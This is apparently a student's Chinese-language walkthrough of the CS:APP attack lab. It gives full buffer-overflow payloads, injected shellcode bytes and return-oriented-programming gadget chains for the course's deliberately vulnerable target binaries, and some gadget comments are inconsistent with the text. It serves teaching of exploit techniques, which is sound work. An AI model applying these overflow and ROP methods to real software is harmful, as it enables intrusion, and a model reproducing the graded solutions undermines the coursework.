# attack-lab

## 预备说明

对于attack-lab，我认为很重点的就是一定要看[操作流程](http://csapp.cs.cmu.edu/3e/attacklab.pdf)，这里大概说明一下，操作流程里主要讲了流程，原理以及一些必要的参数

### 相关操作

1. ./target -q   -q说明是离线，否则就会连接内网。
2. ./hex2raw < a.txt    将a.txt的十六进制码翻译成字符转，同时[操作流程](http://csapp.cs.cmu.edu/3e/attacklab.pdf)也有写但是我推荐使用3中的
3. ./hex2raw < a.txt | ./target -q

### 说明

1. 对于第二部分rop一定要先在网上查资料了解，同时对于level 5 pdf中已经说明这是会花费大量时间的，但是其实和level 4中的解法差不多，但是会在找对应地址十分耗费时间，**我建议理解就可以**.
2. 对于大部分机器都是小端的，因此要输入小端。具体可以看书的第二章。

## 第一部分 Code Injection Attacks

第一部分主要就是代码的直接注入即(Code Injection Attacks)

### level 1

要求：使用缓存区覆盖，将getbuf返回到touch1函数

思路：找到getbuf函数，发现是一个gets函数缓冲区是0x28，因此找到touch1的地址，放到返回地址。

过程：

1. 输出汇编代码到`out.txt`

   ```
   objdump -d ctarget > out.txt
   ```

2. 观察汇编代码

   ```
   00000000004017a8 <getbuf>:
     4017a8:       48 83 ec 28             sub    $0x28,%rsp
     4017ac:       48 89 e7                mov    %rsp,%rdi
     4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
     4017b4:       b8 01 00 00 00          mov    $0x1,%eax
     4017b9:       48 83 c4 28             add    $0x28,%rsp
     4017bd:       c3                      retq
     4017be:       90                      nop
     4017bf:       90                      nop
   ```

   可以看到getbuf的大概就是执行一个gets函数,这里最重要的就是了解到getbuf的缓冲区大小是0x28

	```
    00000000004017c0 <touch1>:
    4017c0:       48 83 ec 08             sub    $0x8,%rsp
    4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
    4017cb:       00 00 00
    4017ce:       bf c5 30 40 00          mov    $0x4030c5,%edi
    4017d3:       e8 e8 f4 ff ff          callq  400cc0 <puts@plt>
    4017d8:       bf 01 00 00 00          mov    $0x1,%edi
    4017dd:       e8 ab 04 00 00          callq  401c8d <validate>
    4017e2:       bf 00 00 00 00          mov    $0x0,%edi
    4017e7:       e8 54 f6 ff ff          callq  400e40 <exit@plt>
   ```

   0x4017c0就是touch1的首地址只需要放到返回地址中

3. 最终的1.txt文件就是

   ```
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   c0 17 40 00 00 00 00 00
   ```

### level 2

要求:返回到函数touch2，并且%rdi要携带cookie

思路:首先将`moveq cookie，%rdi`然后再返回到touch2函数，这里最难的其实是思路的转变，因此我建议直接看，理解后自己完成level 3

过程：

1. 观察汇编代码：

   ```
   00000000004017ec <touch2>:
     4017ec:       48 83 ec 08             sub    $0x8,%rsp
     4017f0:       89 fa                   mov    %edi,%edx
     4017f2:       c7 05 e0 2c 20 00 02    movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
     4017f9:       00 00 00
     4017fc:       3b 3d e2 2c 20 00       cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
     401802:       75 20                   jne    401824 <touch2+0x38>
   ```

   0x4017ec就是函数touch2的首地址，但是这时并不能直接返回因为我们还需要完成`moveq cookie，%rdi`

2. 

   ```shell
   vi 2.s
   ```

   创建一个名为`2.s`的汇编文件

   ```
   movq    $0x59b997fa, %rdi  //将参数放入寄存去
   pushq   $0x4017ec         //push touch2函数的首地址
   ret                       //因此返回就会自动返回touch2的首地址
   ```

   内容如

   ```shell
   gcc -c 2.s
   objdump -d 2.o
   ```

   将汇编文件变成二进制目标文件，再通过反汇编输出

   ```
   0000000000000000 <.text>:
      0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
      7:	68 ec 17 40 00       	pushq  $0x4017ec
      c:	c3                   	retq   
   ```

   这就是指令的十六进制码

3. 这是我们遇到了一个问题再getbuf的ret的返回地址是什么，因此我们再观察当前栈的结构，发现当返回地址位当前栈帧是就会执行我们注入的指令，因此调用gdb 输出当前文件的$rsp即可，并放在最后

4. 最终的2.txt文件就是

   ```
   48 c7 c7 fa 97 b9 59 68
   ec 17 40 00 c3 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00
   ```

### level 3

要求：返回touch3函数，同时参数为一个指向去掉0x的cookie字符串的指针，例如我的cookie是`0x59b997fa`，则字符串就是`59b997fa` .

思路：根据提示我们能想到要放到test的栈帧中，因此首先要查询test的%rsp，然后将十六进制字符串放入，同时返回到touch3函数。

说明：为什么要放到test的栈帧中能，因为当返回到touch3中会有函数进行`sub a，%rsp`就会导致test的一下的栈帧可能会被覆写。

过程：

1. 查询test的栈帧%rsp，直接调用gdb，我查到是0x5561dca8

2. 类似level 2创建一个.s的汇编文件并编译为二进制目标文件，并反编译输出。

   汇编代码内容为：

   ```
   movq  $0x5561dca8 , %rdi
   pushq $0x4018fa
   ret
   ```

   反编译文件为：

   ```
   0000000000000000 <.text>:
      0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
      7:	68 fa 18 40 00       	pushq  $0x4018fa
      c:	c3                   	retq   
   ```

3. 通过 `man ascii`将字符串转移为16进制，这个不用考虑小端

   ```
   35 39 62 39 39 37 66 61 00  //00的原因是数组/0为结尾
   ```
   
4. 最后3.txt文件为

   ```
   48 c7 c7 a8 dc 61 55 68
   fa 18 40 00 c3 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00
   35 39 62 39 39 37 66 61 00
   ```

## 第二部分 Return-Oriented Programming

首先说明rop的大致原理，对于现在的内存会开启随机栈以及不可执行区域预防代码注入也就是我们在第一部分完成的，因此我们可以覆盖函数原始的栈从而确保可执行，但是对于随机栈如何解决呢，这是我们就可以利用小工具gadget，只要我们能够确定小工具的地址，同时截取部分代码使得执行一些组合指令，就可以了。同时对于如何构建符合的指令顺序呢，这是我们只需要在每个指令后加入ret也就是对于截取片段要有0xc3，我们返回的地址正是我们下一个指令的地址，就可以了。

### level 1

要求：完成touch2，其他跟上面level 2的相同。

思路：如上

过程：

1. 根据前面我们可以得到汇编代码为

   ```
   movq    $0x59b997fa, %rdi
   pushq   $0x4017ec         
   ret                   
   ```

   但是对于rop我们可以简化得到汇编代码

   ```
   popq %rdx
   ret
   
   movq %rdx, %rdi
   ret
   ```

   根据farm.s和对应的表(表在[操作流程](http://csapp.cs.cmu.edu/3e/attacklab.pdf))可以得到最终的答案

2. 最终的4.txt为

   ```
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00  //0x28
   AB 19 40 00 00 00 00 00  //popq %rax ret
   FA 97 B9 59 00 00 00 00  //数字
   A2 19 40 00 00 00 00 00  //moveq %rdx，%rdi ret
   EC 17 40 00 00 00 00 00  //返回地址
   ```

### level 2

要求：完成level 3

思路：如上

过程：由于过程过于繁琐我在这里只填答案和一些说明

1. 根据提示我们可以得到一共要用8个工具，因此的到汇编代码

   ```
   movq %rax, %rdi
   leap(%rdi, %rsi, 1), %rax
   movl %ecx,%rsi
   movl %edx,%ecx
   movl %eax,%edx
   0x48
   popq %rax
   movq %rax,%rdi
   movq %rsp,%rax
   ```

2. 对应的5.txt为

   ```
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   06 1a 40 00 00 00 00 00  movq %rsp,%rax
   a2 19 40 00 00 00 00 00  movq %rax,%rdi
   cc 19 40 00 00 00 00 00  popq %rax
   48 00 00 00 00 00 00 00  0x48
   dd 19 40 00 00 00 00 00  movl %eax,%edx
   70 1a 40 00 00 00 00 00  movl %edx,%ecx
   13 1a 40 00 00 00 00 00  movl %ecx,%rsi
   d6 19 40 00 00 00 00 00  leap(%rdi, %rsi, 1), %rax
   a2 19 40 00 00 00 00 00  movq %rax, %rdi
   fa 18 40 00 00 00 00 00  touch3地址
   35 39 62 39 39 37 66 61 00  cookie字符串
   ```

   
